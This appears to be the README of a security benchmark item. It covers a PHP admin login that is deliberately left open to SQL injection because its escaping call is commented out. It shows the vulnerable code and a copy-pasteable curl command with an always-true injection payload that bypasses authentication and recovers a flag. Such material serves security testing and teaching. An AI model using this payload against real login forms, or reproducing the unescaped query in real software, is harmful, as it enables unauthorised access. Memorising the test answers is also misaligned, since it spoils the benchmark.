# XBEN-039-24 — Easy Login (SQL Injection Authentication Bypass)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Classic SQL Injection in the admin login form. `admin.php` builds the
authentication query by directly concatenating the raw `username` POST parameter (the
`mysqli_real_escape_string` call is explicitly commented out), so a crafted username can turn
the `WHERE` clause into an always-true condition and log in without knowing the admin password.

## Root cause (app/html/admin.php)

```php
$username = $_POST['username']; #vuln
#$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = MD5($_POST['password']);

$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);

if ($result->num_rows == 1) {
    $_SESSION['admin_logged_in'] = true;
    echo "@FLAG@";   // flag is baked into the template at build time
}
```

## Exploit (copy-pasteable, port substituted for this run: 55290)

```bash
PORT=55290
curl -s -X POST http://localhost:$PORT/admin.php \
  --data-urlencode "username=admin' OR '1'='1' -- " \
  --data-urlencode "password=whatever"
```

This makes the server-side query:

```sql
SELECT id FROM admins WHERE username = 'admin' OR '1'='1' -- ' AND password = '...'
```

which always returns a row (`num_rows == 1`), satisfying the login check regardless of the
real admin password.
